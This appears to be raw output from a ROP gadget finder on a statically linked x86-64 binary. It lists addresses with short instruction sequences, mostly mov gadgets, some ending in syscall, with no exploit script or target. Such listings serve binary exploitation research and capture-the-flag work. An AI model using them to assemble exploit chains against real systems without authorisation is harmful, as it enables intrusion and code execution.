0x000000000044b254 : mov dword ptr [rdi], edx ; lea rax, qword ptr [rdi + 1] ; ret
0x000000000044b272 : mov dword ptr [rdi], edx ; lea rax, qword ptr [rdi + 3] ; ret
0x000000000044b2c4 : mov dword ptr [rdi], edx ; lea rax, qword ptr [rdi + 7] ; ret
0x000000000043c064 : mov dword ptr [rdi], edx ; ret
0x000000000043f01f : mov dword ptr [rdi], esi ; mov dword ptr [r9 - 4], ecx ; ret
0x000000000048b0f6 : mov dword ptr [rdi], esi ; mov dword ptr [rdx], eax ; mov eax, 1 ; ret
0x000000000043f00e : mov dword ptr [rdi], esi ; mov qword ptr [r9 - 8], rcx ; ret
0x000000000043f033 : mov dword ptr [rdi], esi ; mov word ptr [r9 - 2], cx ; ret
0x000000000044da4c : mov dword ptr [rdi], esi ; ret
0x0000000000419575 : mov dword ptr [rdx + 0x130], edi ; pop rbx ; ret
0x0000000000400fe5 : mov dword ptr [rdx + 0x18], eax ; mov eax, 1 ; ret
0x000000000044a7d7 : mov dword ptr [rdx + 3], eax ; lea rax, qword ptr [rdx + 6] ; ret
0x0000000000449007 : mov dword ptr [rdx + 3], eax ; mov rax, rdi ; ret
0x000000000044a7b9 : mov dword ptr [rdx + 4], eax ; lea rax, qword ptr [rdx + 5] ; ret
0x0000000000448ff9 : mov dword ptr [rdx + 4], eax ; mov rax, rdi ; ret
0x000000000044a86b : mov dword ptr [rdx + 5], eax ; lea rax, qword ptr [rdx + 0xc] ; ret
0x000000000044a7e9 : mov dword ptr [rdx + 5], eax ; lea rax, qword ptr [rdx + 8] ; ret
0x0000000000449019 : mov dword ptr [rdx + 5], eax ; mov rax, rdi ; ret
0x000000000044a88b : mov dword ptr [rdx + 6], eax ; lea rax, qword ptr [rdx + 0xd] ; ret
0x000000000044a809 : mov dword ptr [rdx + 6], eax ; lea rax, qword ptr [rdx + 9] ; ret
0x0000000000449029 : mov dword ptr [rdx + 6], eax ; mov rax, rdi ; ret
0x000000000044a829 : mov dword ptr [rdx + 7], eax ; lea rax, qword ptr [rdx + 0xa] ; ret
0x000000000044a8ab : mov dword ptr [rdx + 7], eax ; lea rax, qword ptr [rdx + 0xe] ; ret
0x0000000000449039 : mov dword ptr [rdx + 7], eax ; mov rax, rdi ; ret
0x000000000044a849 : mov dword ptr [rdx + 8], eax ; lea rax, qword ptr [rdx + 0xb] ; ret
0x000000000044a73b : mov dword ptr [rdx + 8], eax ; lea rax, qword ptr [rdx + 0xf] ; ret
0x0000000000402242 : mov dword ptr [rdx + 8], eax ; mov eax, 1 ; ret
0x0000000000448f8b : mov dword ptr [rdx + 8], eax ; mov rax, rdi ; ret
0x000000000041ee90 : mov dword ptr [rdx + 8], eax ; xor eax, eax ; ret
0x000000000044a764 : mov dword ptr [rdx], eax ; lea rax, qword ptr [rdx + 1] ; ret
0x000000000044a792 : mov dword ptr [rdx], eax ; lea rax, qword ptr [rdx + 3] ; ret
0x000000000044a6e4 : mov dword ptr [rdx], eax ; lea rax, qword ptr [rdx + 7] ; ret
0x000000000045009a : mov dword ptr [rdx], eax ; mov eax, 0xffffffff ; ret
0x000000000048b0f8 : mov dword ptr [rdx], eax ; mov eax, 1 ; ret
0x000000000048b255 : mov dword ptr [rdx], eax ; mov eax, 2 ; ret
0x000000000045034a : mov dword ptr [rdx], eax ; mov rax, -1 ; ret
0x0000000000448f34 : mov dword ptr [rdx], eax ; mov rax, rdi ; ret
0x000000000048ba2d : mov dword ptr [rdx], eax ; pop rbx ; ret
0x000000000041edf8 : mov dword ptr [rdx], eax ; ret
0x0000000000496d0f : mov dword ptr [rip + 0x22d01b], ebx ; jne 0x496d01 ; pop rbx ; ret
0x000000000048b558 : mov dword ptr [rip + 0x238b4a], eax ; ret
0x0000000000485e85 : mov dword ptr [rip + 0x23e8a5], eax ; ret
0x0000000000461788 : mov dword ptr [rip + 0x26132a], edx ; je 0x4617a1 ; ret
0x0000000000453fe6 : mov dword ptr [rip + 0x26cacc], edx ; pop rbx ; ret
0x00000000004262a6 : mov dword ptr [rip + 0x29b5b4], eax ; ret
0x00000000004201cc : mov dword ptr [rip + 0x2a168e], eax ; ret
0x000000000041fcc7 : mov dword ptr [rip + 0x2a1b23], eax ; ret
0x000000000041fcde : mov dword ptr [rip + 0x2a1b28], eax ; ret
0x000000000041fc9f : mov dword ptr [rip + 0x2a1b43], eax ; ret
0x000000000041fc7f : mov dword ptr [rip + 0x2a1b5b], eax ; ret
0x000000000041fb75 : mov dword ptr [rip + 0x2a1ccd], eax ; ret
0x000000000041fb65 : mov dword ptr [rip + 0x2a1cd5], eax ; ret
0x000000000041fb53 : mov dword ptr [rip + 0x2a1cd7], edx ; ret
0x000000000041fb15 : mov dword ptr [rip + 0x2a1cdd], eax ; ret
0x000000000041fb05 : mov dword ptr [rip + 0x2a1cf5], eax ; ret
0x000000000041fcf4 : mov dword ptr [rip + 0x2a40da], eax ; ret
0x000000000044d7a6 : mov dword ptr [rsi - 2], ecx ; ret
0x000000000044d799 : mov dword ptr [rsi - 4], ecx ; ret
0x000000000047f451 : mov dword ptr [rsi], 0xffffffff ; xor eax, eax ; ret
0x0000000000493dfe : mov dword ptr [rsi], eax ; mov rax, qword ptr [rdi + 0x98] ; ret
0x0000000000485ff2 : mov dword ptr [rsi], eax ; ret
0x0000000000485339 : mov dword ptr [rsi], edi ; mov rax, rcx ; ret
0x0000000000463cfa : mov dword ptr [rsi], edi ; xor eax, eax ; jmp 0x463cc6
0x000000000042346a : mov dword ptr [rsp + 0x10], ebx ; mov qword ptr [rsp + 8], rax ; call rcx
0x0000000000423527 : mov dword ptr [rsp + 0x10], edx ; mov qword ptr [rsp + 8], rax ; call rcx
0x0000000000457dcc : mov dword ptr [rsp + 0x50], eax ; call 0x454026
0x000000000042346f : mov dword ptr [rsp + 8], eax ; call rcx
0x0000000000417cfe : mov dword ptr [rsp + 8], ecx ; mov rdi, r15 ; call rax
0x0000000000423a84 : mov dword ptr [rsp + 8], edx ; call 0x41fd26
0x0000000000423a83 : mov dword ptr [rsp + 8], r10d ; call 0x41fd27
0x00000000004907c3 : mov dword ptr [rsp], eax ; mov rsi, r12 ; mov edi, ebp ; call rax
0x0000000000419dd2 : mov dword ptr [rsp], ecx ; mov rdi, rbx ; call rax
0x000000000041d0e5 : mov dword ptr [rsp], edi ; call 0x419375
0x000000000046cbbc : mov dword ptr fs:[rax], 0x16 ; mov eax, edx ; ret
0x0000000000415bb1 : mov dword ptr fs:[rax], 0x16 ; xor eax, eax ; ret
0x000000000047c56c : mov dword ptr fs:[rax], edx ; xor eax, eax ; ret
0x00000000004506e3 : mov dword ptr fs:[rcx], eax ; mov eax, 0xffffffff ; jmp 0x4506b8
0x0000000000450009 : mov dword ptr fs:[rcx], eax ; or rax, 0xffffffffffffffff ; ret
0x0000000000450099 : mov dword ptr fs:[rdx], eax ; mov eax, 0xffffffff ; ret
0x000000000044da54 : mov dword ptr ss:[rdi + rdx - 4], ecx ; mov dword ptr [rdi], esi ; ret
0x0000000000436180 : mov dx, word ptr [rsi - 2] ; mov word ptr [rdi - 2], dx ; ret
0x000000000044ac30 : mov dx, word ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x0000000000400ed9 : mov eax, 0 ; leave ; ret
0x000000000044ec8b : mov eax, 0x10 ; pop rbx ; ret
0x0000000000429f80 : mov eax, 0x16 ; ret
0x000000000044ec99 : mov eax, 0x20 ; pop rbx ; ret
0x000000000048bef0 : mov eax, 0x27 ; syscall ; ret
0x000000000044ec92 : mov eax, 0x30 ; pop rbx ; ret
0x000000000044eca7 : mov eax, 0x40 ; pop rbx ; ret
0x00000000004adf9b : mov eax, 0x45155e93 ; ret 0x591c
0x000000000045e788 : mov eax, 0x5b000000 ; pop r12 ; ret
0x00000000004868f9 : mov eax, 0x5b010023 ; ret
0x000000000044eca0 : mov eax, 0x60 ; pop rbx ; ret
0x000000000047c180 : mov eax, 0x66 ; syscall ; ret
0x000000000047c1a0 : mov eax, 0x68 ; syscall ; ret
0x000000000047c190 : mov eax, 0x6b ; syscall ; ret
0x000000000047c1b0 : mov eax, 0x6c ; syscall ; ret
0x000000000044ec7d : mov eax, 0x80 ; pop rbx ; ret
0x00000000004b7bb4 : mov eax, 0x8000051 ; lodsb al, byte ptr [rsi] ; stc ; jmp qword ptr [rcx]
0x00000000004ba5b4 : mov eax, 0x8800007b ; add bh, ah ; jmp qword ptr [rbx]
0x00000000004905cf : mov eax, 0x89000003 ; fmul dword ptr [rbx + rcx*4 + 0x34] ; ret 0xf41
0x00000000004733e1 : mov eax, 0x8900001d ; ret 0x349
0x000000000048d7e4 : mov eax, 0x89fd8945 ; ret 0xe283
0x000000000047ba20 : mov eax, 0xc9 ; syscall ; ret
0x0000000000452872 : mov eax, 0xca ; syscall ; pop rdx ; pop rsi ; ret
0x00000000004b7cb4 : mov eax, 0xd8000052 ; lodsd eax, dword ptr [rsi] ; stc ; call qword ptr [rdx]
0x000000000045ef4c : mov eax, 0xff50cee8 ; dec dword ptr [rcx + rcx*4 - 9] ; call rbx
0x00000000004506e6 : mov eax, 0xffffffff ; jmp 0x4506b5
0x00000000004189f1 : mov eax, 0xffffffff ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000418777 : mov eax, 0xffffffff ; pop rbx ; pop rbp ; ret
0x00000000004198f3 : mov eax, 0xffffffff ; pop rbx ; ret
0x000000000041873b : mov eax, 0xffffffff ; ret
0x0000000000400c5e : mov eax, 1 ; leave ; ret
0x000000000048b0d5 : mov eax, 1 ; mov qword ptr [rdi], rsi ; ret
0x0000000000401359 : mov eax, 1 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000048d41d : mov eax, 1 ; pop rbx ; pop rbp ; ret
0x0000000000486900 : mov eax, 1 ; pop rbx ; ret
0x0000000000400fe8 : mov eax, 1 ; ret
0x000000000047b273 : mov eax, 2 ; ret
0x000000000047b4d1 : mov eax, 3 ; ret
0x0000000000494c7f : mov eax, 4 ; jne 0x494ca8 ; ret
0x000000000047b4e1 : mov eax, 4 ; ret
0x000000000047b4f1 : mov eax, 5 ; ret
0x000000000047b501 : mov eax, 6 ; ret
0x000000000047b511 : mov eax, 7 ; ret
0x000000000044ec84 : mov eax, 8 ; pop rbx ; ret
0x0000000000455480 : mov eax, 8 ; ret
0x0000000000418291 : mov eax, dword ptr [rax + 0x20] ; jmp rax
0x0000000000478b04 : mov eax, dword ptr [rax + 0x4c] ; ret
0x000000000041de48 : mov eax, dword ptr [rax + 0x68] ; test rax, rax ; jne 0x41de49 ; ret
0x0000000000488691 : mov eax, dword ptr [rax + 8] ; ret
0x000000000045fdc0 : mov eax, dword ptr [rax + rbp*8] ; test rax, rax ; je 0x45fdd2 ; call rax
0x0000000000472937 : mov eax, dword ptr [rax + rcx*8] ; mov ecx, 1 ; jmp rax
0x00000000004617cf : mov eax, dword ptr [rax + rdi*8 + 0x80] ; ret
0x000000000046752d : mov eax, dword ptr [rax + rdi*8] ; jmp rax
0x0000000000491a39 : mov eax, dword ptr [rax] ; lea rax, qword ptr [rax + 8] ; mov qword ptr [r10], r8 ; ret
0x0000000000491a21 : mov eax, dword ptr [rax] ; mov qword ptr [r10], r8 ; ret
0x0000000000486919 : mov eax, dword ptr [rax] ; ret
0x0000000000483200 : mov eax, dword ptr [rbp - 0xb8] ; add rax, r11 ; call rax
0x0000000000483021 : mov eax, dword ptr [rbx + 0x10] ; add rax, qword ptr [r14] ; call rax
0x000000000041d0cd : mov eax, dword ptr [rbx + 0x18] ; add rsp, 0x10 ; pop rbx ; jmp rax
0x000000000048ba49 : mov eax, dword ptr [rbx + 0x18] ; mov qword ptr [rax], rdi ; pop rbx ; ret
0x000000000041d7b9 : mov eax, dword ptr [rbx + 0x40] ; add rsp, 0x20 ; pop rbx ; jmp rax
0x0000000000457dc9 : mov eax, dword ptr [rbx] ; mov qword ptr [rsp + 0x50], rax ; call 0x454029
0x0000000000406db4 : mov eax, dword ptr [rcx + 0x21] ; ret
0x0000000000449004 : mov eax, dword ptr [rcx + 3] ; mov dword ptr [rdx + 3], eax ; mov rax, rdi ; ret
0x0000000000449016 : mov eax, dword ptr [rcx + 5] ; mov dword ptr [rdx + 5], eax ; mov rax, rdi ; ret
0x0000000000449026 : mov eax, dword ptr [rcx + 6] ; mov dword ptr [rdx + 6], eax ; mov rax, rdi ; ret
0x0000000000449036 : mov eax, dword ptr [rcx + 7] ; mov dword ptr [rdx + 7], eax ; mov rax, rdi ; ret
0x0000000000449046 : mov eax, dword ptr [rcx + 8] ; mov dword ptr [rdx + 8], eax ; mov rax, rdi ; ret
0x0000000000443c1a : mov eax, dword ptr [rcx + rax*4] ; mov edx, dword ptr [rcx + rdx*4] ; sub eax, edx ; ret
0x00000000004454f2 : mov eax, dword ptr [rcx + rax*4] ; sub eax, edx ; ret
0x000000000044a790 : mov eax, dword ptr [rcx] ; mov dword ptr [rdx], eax ; lea rax, qword ptr [rdx + 3] ; ret
0x0000000000448fd0 : mov eax, dword ptr [rcx] ; mov dword ptr [rdx], eax ; mov rax, rdi ; ret
0x000000000044a6e1 : mov eax, dword ptr [rcx] ; mov qword ptr [rdx], rax ; lea rax, qword ptr [rdx + 7] ; ret
0x0000000000448f31 : mov eax, dword ptr [rcx] ; mov qword ptr [rdx], rax ; mov rax, rdi ; ret
0x000000000044a761 : mov eax, dword ptr [rcx] ; mov word ptr [rdx], ax ; lea rax, qword ptr [rdx + 1] ; ret
0x0000000000448fb1 : mov eax, dword ptr [rcx] ; mov word ptr [rdx], ax ; mov rax, rdi ; ret
0x0000000000483806 : mov eax, dword ptr [rdi + 0x10] ; add rax, qword ptr [r14] ; call rax
0x000000000047895e : mov eax, dword ptr [rdi + 0x10] ; sar rdx, 2 ; sub eax, edx ; ret
0x000000000041ee00 : mov eax, dword ptr [rdi + 0x10] ; sub eax, dword ptr [rsi + 0x10] ; ret
0x000000000041ee28 : mov eax, dword ptr [rdi + 0x10] ; sub eax, edx ; ret
0x000000000049794d : mov eax, dword ptr [rdi + 0x20] ; test rax, rax ; je 0x497964 ; call rax
0x0000000000478b01 : mov eax, dword ptr [rdi + 0x48] ; mov eax, dword ptr [rax + 0x4c] ; ret
0x000000000041f151 : mov eax, dword ptr [rdi + 0x68] ; ret
0x0000000000493d91 : mov eax, dword ptr [rdi + 0x90] ; ret
0x0000000000493de1 : mov eax, dword ptr [rdi + 0x98] ; ret
0x0000000000493e21 : mov eax, dword ptr [rdi + 0xa0] ; ret
0x0000000000493e81 : mov eax, dword ptr [rdi + 0xa8] ; ret
0x0000000000493e71 : mov eax, dword ptr [rdi + 0xb0] ; ret
0x0000000000493e31 : mov eax, dword ptr [rdi + 0xb8] ; ret
0x0000000000467a77 : mov eax, dword ptr [rdi + rax*8] ; jmp rax
0x000000000048e901 : mov eax, dword ptr [rdi] ; cmp rax, rsi ; je 0x48e918 ; ret
0x000000000041edf5 : mov eax, dword ptr [rdi] ; mov qword ptr [rdx], rax ; ret
0x000000000041fcf1 : mov eax, dword ptr [rdi] ; nop ; mov dword ptr [rip + 0x2a40da], eax ; ret
0x00000000004960e5 : mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x4960f7 ; ret
0x0000000000496100 : mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x496117 ; ret
0x0000000000496330 : mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x496347 ; ret
0x00000000004852ec : mov eax, dword ptr [rdx + 4] ; ret
0x000000000044f1b7 : mov eax, dword ptr [rdx + rax*4] ; sub eax, dword ptr [rdx + rcx*4] ; je 0x44f1a9 ; ret
0x0000000000441826 : mov eax, dword ptr [rdx + rax*4] ; sub eax, ecx ; ret
0x000000000041ede1 : mov eax, dword ptr [rdx] ; test rax, rax ; jne 0x41ede0 ; ret
0x000000000048c0f0 : mov eax, dword ptr [rip + 0x238b4a] ; ret
0x0000000000485feb : mov eax, dword ptr [rip + 0x23e737] ; mov qword ptr [rsi], rax ; ret
0x0000000000485f7a : mov eax, dword ptr [rip + 0x23e7b0] ; ret
0x000000000045e631 : mov eax, dword ptr [rip + 0x265881] ; ret
0x00000000004560d1 : mov eax, dword ptr [rip + 0x26ebd1] ; ret
0x000000000041f131 : mov eax, dword ptr [rip + 0x2a1fe9] ; ret
0x0000000000494cd2 : mov eax, dword ptr [rsi + 0x10] ; ret
0x0000000000491b61 : mov eax, dword ptr [rsi + 0xa8] ; ret
0x0000000000491b34 : mov eax, dword ptr [rsi + 0xb0] ; ret
0x0000000000491b51 : mov eax, dword ptr [rsi + 0xb8] ; ret
0x0000000000494cf1 : mov eax, dword ptr [rsi + 8] ; ret
0x00000000004728fc : mov eax, dword ptr [rsi + rax*8] ; jmp rax
0x0000000000467ac1 : mov eax, dword ptr [rsi + rax*8] ; mov esi, 1 ; jmp rax
0x0000000000468119 : mov eax, dword ptr [rsi + rax*8] ; xor esi, esi ; jmp rax
0x0000000000477b6f : mov eax, dword ptr [rsi] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000493e56 : mov eax, dword ptr [rsp + 0x10] ; add rsp, 0x28 ; ret
0x00000000004512c6 : mov eax, dword ptr [rsp + 0x10] ; call rax
0x0000000000407ab3 : mov eax, dword ptr [rsp + 0x18] ; call rax
0x0000000000459d3c : mov eax, dword ptr [rsp + 0x20] ; call rax
0x00000000004506ba : mov eax, dword ptr [rsp + 0xc] ; add rsp, 0x10 ; pop rbx ; ret
0x000000000045063d : mov eax, dword ptr [rsp + 0xc] ; jne 0x450612 ; neg eax ; jmp 0x450612
0x000000000041488d : mov eax, dword ptr [rsp + 8] ; call rax
0x00000000004019de : mov eax, dword ptr [rsp + 8] ; sub rax, rcx ; ret
0x000000000048d88f : mov eax, dword ptr [rsp] ; add rax, qword ptr [rdx + 8] ; call rax
0x00000000004915ca : mov eax, dword ptr [rsp] ; add rsp, 0x38 ; ret
0x0000000000486918 : mov eax, dword ptr fs:[rax] ; ret
0x00000000004213a0 : mov eax, eax ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00000000004015fe : mov eax, eax ; cdqe ; ret
0x000000000042917f : mov eax, eax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000044ecc2 : mov eax, eax ; ret
0x000000000047b894 : mov eax, eax ; shr rax, 2 ; vzeroupper ; ret
0x000000000047a6d1 : mov eax, eax ; vzeroupper ; ret
0x0000000000401b0c : mov eax, ebp ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000451ca4 : mov eax, ebp ; pop rbx ; pop rbp ; jmp rax
0x0000000000416c23 : mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000004166de : mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004186e2 : mov eax, ebp ; pop rbx ; pop rbp ; ret
0x000000000048b063 : mov eax, ebx ; adc rax, rdx ; pop rbp ; pop rbx ; ret
0x0000000000401e14 : mov eax, ebx ; cmovne eax, edx ; pop rbx ; ret
0x000000000048f077 : mov eax, ebx ; jne 0x48f095 ; add rsp, 0x40 ; pop rbx ; ret
0x000000000048f15e : mov eax, ebx ; jne 0x48f17d ; add rsp, 0x50 ; pop rbx ; ret
0x000000000040153d : mov eax, ebx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000041b185 : mov eax, ebx ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000450ee0 : mov eax, ebx ; pop rbx ; pop rbp ; ret
0x00000000004194fb : mov eax, ebx ; pop rbx ; ret
0x0000000000401970 : mov eax, ebx ; ret
0x000000000048af27 : mov eax, ecx ; adc eax, eax ; ret
0x000000000046caa5 : mov eax, ecx ; ret
0x00000000004b6cf9 : mov eax, edi ; call qword ptr [rax]
0x00000000004b6d0d : mov eax, edi ; jmp qword ptr [rsi]
0x00000000004193f3 : mov eax, edi ; mov dword ptr [rbx], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000421635 : mov eax, edi ; pop rbp ; pop r12 ; ret
0x0000000000419424 : mov eax, edi ; ret
0x0000000000421235 : mov eax, edx ; add rsp, 8 ; ret
0x00000000004017fd : mov eax, edx ; mov rbx, r8 ; or rax, r9 ; ret
0x0000000000416f70 : mov eax, edx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000046cb6e : mov eax, edx ; pop rbp ; pop r12 ; ret
0x0000000000417019 : mov eax, edx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000004169b1 : mov eax, edx ; pop rbx ; pop rbp ; ret
0x000000000044ecc6 : mov eax, edx ; pop rbx ; ret
0x0000000000421241 : mov eax, edx ; ret
0x00000000004892d7 : mov eax, esi ; mov rsp, r8 ; mov rbp, r9 ; nop ; jmp rdx
0x000000000041a6ca : mov eax, esi ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00000000004767c4 : mov eax, esi ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000452a19 : mov eax, esi ; pop rbx ; pop rbp ; ret
0x00000000004171f4 : mov eax, esi ; pop rbx ; ret
0x0000000000424731 : mov eax, esi ; ret
0x00000000004758f8 : mov eax, esp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000004015fd : mov eax, r8d ; cdqe ; ret
0x000000000046caa4 : mov eax, r9d ; ret
0x0000000000473009 : mov ebp, 0x8b480024 ; add al, 0xf8 ; jmp rax
0x000000000049b6d9 : mov ebp, 0xbed0fff9 ; stc ; jmp qword ptr [rax]
0x00000000004a6384 : mov ebp, 0xc000000f ; sldt word ptr [rax] ; ret
0x00000000004ad45d : mov ebp, 0xc1c0bfbe ; ret 0xc4c3
0x0000000000479e98 : mov ebp, 0xf80148c0 ; ret
0x000000000047a11c : mov ebp, 0xf80148c6 ; ret
0x00000000004aebc6 : mov ebp, 0xfb67d10d ; ret
0x000000000046fdee : mov ebp, 0xfffff730 ; call rax
0x00000000004648dc : mov ebp, 0xfffff758 ; call rax
0x0000000000472de9 : mov ebp, 0xfffffae8 ; add byte ptr [rcx - 0x77], al ; ret 0x1674
0x000000000046bcc5 : mov ebp, 0xffffff40 ; call rax
0x00000000004942b3 : mov ebp, dword ptr [rbp] ; mov rsp, rcx ; ret
0x0000000000407531 : mov ebp, dword ptr [rsp + 0x20] ; add rsp, 0x28 ; ret
0x00000000004954fa : mov ebp, dword ptr [rsp + 8] ; jmp 0x495518
0x0000000000476a59 : mov ebp, eax ; jmp 0x476a22
0x00000000004892dd : mov ebp, ecx ; nop ; jmp rdx
0x00000000004035a4 : mov ebx, 0x2e766a0a ; leave ; ret 0x8581
0x0000000000472a93 : mov ebx, 0x89000025 ; ret 0x349
0x0000000000453ff1 : mov ebx, 0x89000281 ; ret
0x00000000004528a4 : mov ebx, 0xafb8341 ; je 0x4528b3 ; ret
0x00000000004ad45b : mov ebx, 0xbfbebdbc ; rol cl, 0xc2 ; ret
0x000000000042b2cb : mov ebx, 0xf480001 ; ret 0x66c3
0x0000000000415cc4 : mov ebx, 1 ; jmp 0x415c93
0x0000000000463c5c : mov ebx, 1 ; jmp 0x463c2b
0x0000000000403454 : mov ebx, dword ptr [rsi - 8] ; lea rsp, qword ptr [rsi] ; ret
0x0000000000401800 : mov ebx, eax ; or rax, r9 ; ret
0x00000000004611c6 : mov ebx, edi ; test rax, rax ; je 0x4611d6 ; call rax
0x000000000047c2cc : mov ecx, 0x48000000 ; add esp, 0x78 ; ret
0x00000000004ad459 : mov ecx, 0xbdbcbbba ; mov esi, 0xc2c1c0bf ; ret
0x000000000047293a : mov ecx, 1 ; jmp rax
0x000000000043f01c : mov ecx, dword ptr [rcx - 4] ; mov dword ptr [rdi], esi ; mov dword ptr [r9 - 4], ecx ; ret
0x00000000004343ce : mov ecx, dword ptr [rdi - 0x73] ; or al, 0xb ; jmp r9
0x0000000000478adb : mov ecx, dword ptr [rdx + 0x48] ; cmp ecx, dword ptr [rdx + 0x4c] ; cmove eax, ecx ; ret
0x0000000000441823 : mov ecx, dword ptr [rdx + rcx*4] ; mov eax, dword ptr [rdx + rax*4] ; sub eax, ecx ; ret
0x0000000000436743 : mov ecx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 5], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000436943 : mov ecx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 6], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000436b43 : mov ecx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 7], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x000000000044ac60 : mov ecx, dword ptr [rsi] ; mov byte ptr [rdi + 4], dh ; mov dword ptr [rdi], ecx ; ret
0x000000000044aca1 : mov ecx, dword ptr [rsi] ; mov byte ptr [rdi + 8], dh ; mov qword ptr [rdi], rcx ; ret
0x000000000043c1b3 : mov ecx, dword ptr [rsi] ; mov dword ptr [rdi + 1], edx ; mov dword ptr [rdi], ecx ; ret
0x000000000043c143 : mov ecx, dword ptr [rsi] ; mov dword ptr [rdi + 2], edx ; mov dword ptr [rdi], ecx ; ret
0x000000000043c0d3 : mov ecx, dword ptr [rsi] ; mov dword ptr [rdi + 3], edx ; mov dword ptr [rdi], ecx ; ret
0x000000000043bff5 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 1], rdx ; mov qword ptr [rdi], rcx ; ret
0x000000000043bf85 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 2], rdx ; mov qword ptr [rdi], rcx ; ret
0x000000000043bf15 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 3], rdx ; mov qword ptr [rdi], rcx ; ret
0x000000000043bea5 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 4], rdx ; mov qword ptr [rdi], rcx ; ret
0x000000000043be35 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 5], rdx ; mov qword ptr [rdi], rcx ; ret
0x000000000043bdc5 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 6], rdx ; mov qword ptr [rdi], rcx ; ret
0x000000000043bd55 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 7], rdx ; mov qword ptr [rdi], rcx ; ret
0x000000000043c295 : mov ecx, dword ptr [rsi] ; mov word ptr [rdi + 1], dx ; mov word ptr [rdi], cx ; ret
0x000000000044ac41 : mov ecx, dword ptr [rsi] ; mov word ptr [rdi], cx ; mov byte ptr [rdi + 2], dh ; ret
0x0000000000488787 : mov ecx, dword ptr [rsp + 0x40] ; add rsp, 0x48 ; jmp qword ptr [rax]
0x0000000000488715 : mov ecx, dword ptr [rsp + 0x40] ; add rsp, 0x58 ; jmp qword ptr [rax]
0x0000000000479111 : mov ecx, eax ; jmp 0x4790db
0x00000000004553bb : mov ecx, ebp ; call rbx
0x000000000049b2e1 : mov ecx, edi ; jmp qword ptr [rsi]
0x000000000041dbe0 : mov ecx, edx ; pop rbx ; xor edx, edx ; jmp rax
0x000000000044da22 : mov ecx, edx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000400dc3 : mov ecx, edx ; rep movsq qword ptr [rdi], qword ptr [rsi] ; nop ; leave ; ret
0x000000000041dc1a : mov ecx, edx ; xor edx, edx ; jmp rax
0x000000000047ae95 : mov ecx, esi ; call rbx
0x000000000046612a : mov edi, 0x440f48c0 ; ret 0xae9
0x0000000000400acc : mov edi, 0x6c2bd0 ; jmp rax
0x0000000000416c3e : mov edi, 0x8948002a ; ret 0x8948
0x00000000004732cf : mov edi, 0x8b480024 ; add al, 0xf8 ; jmp rax
0x0000000000493ae6 : mov edi, 1 ; call r14
0x0000000000493a3c : mov edi, 1 ; call rax
0x00000000004947ac : mov edi, 1 ; jmp rax
0x0000000000415324 : mov edi, dword ptr [rax + 0x20] ; call rdx
0x00000000004516fc : mov edi, dword ptr [rbp - 0x58] ; mov r12d, r14d ; call r15
0x00000000004648db : mov edi, dword ptr [rbp - 0x8a8] ; call rax
0x000000000046fded : mov edi, dword ptr [rbp - 0x8d0] ; call rax
0x000000000046bcc4 : mov edi, dword ptr [rbp - 0xc0] ; call rax
0x0000000000494131 : mov edi, dword ptr [rbp - 8] ; leave ; ret
0x00000000004511e4 : mov edi, dword ptr [rbp] ; call r12
0x0000000000414889 : mov edi, dword ptr [rbp] ; mov rax, qword ptr [rsp + 8] ; call rax
0x00000000004511be : mov edi, dword ptr [rbx] ; call r12
0x00000000004833ef : mov edi, dword ptr [rbx] ; mov rax, qword ptr [rbx + 0x10] ; add rax, qword ptr [r14] ; call rax
0x0000000000485fc6 : mov edi, dword ptr [rdi + 8] ; test rdi, rdi ; jne 0x485fa9 ; ret
0x00000000004aee86 : mov edi, dword ptr [rdx] ; ret
0x0000000000495a0e : mov edi, dword ptr [rsp + 0x10] ; call r14
0x00000000004891b4 : mov edi, dword ptr [rsp + 0x18] ; mov rdx, qword ptr [rsp + 0x10] ; call rdx
0x0000000000457b05 : mov edi, dword ptr [rsp + 0x20] ; call r15
0x00000000004579d0 : mov edi, dword ptr [rsp + 0x20] ; mov rax, qword ptr [rsp + 0x10] ; call rax
0x00000000004583e1 : mov edi, dword ptr [rsp + 0x30] ; call r14
0x00000000004585b9 : mov edi, dword ptr [rsp + 0x30] ; call rbx
0x00000000004588a3 : mov edi, dword ptr [rsp + 0x38] ; call r12
0x0000000000458edb : mov edi, dword ptr [rsp + 0x38] ; call r14
0x000000000045be9f : mov edi, dword ptr [rsp + 0x38] ; call r15
0x00000000004580e9 : mov edi, dword ptr [rsp + 0x38] ; call rbx
0x0000000000457df5 : mov edi, dword ptr [rsp + 0x38] ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x000000000045a31a : mov edi, dword ptr [rsp + 0x40] ; call r15
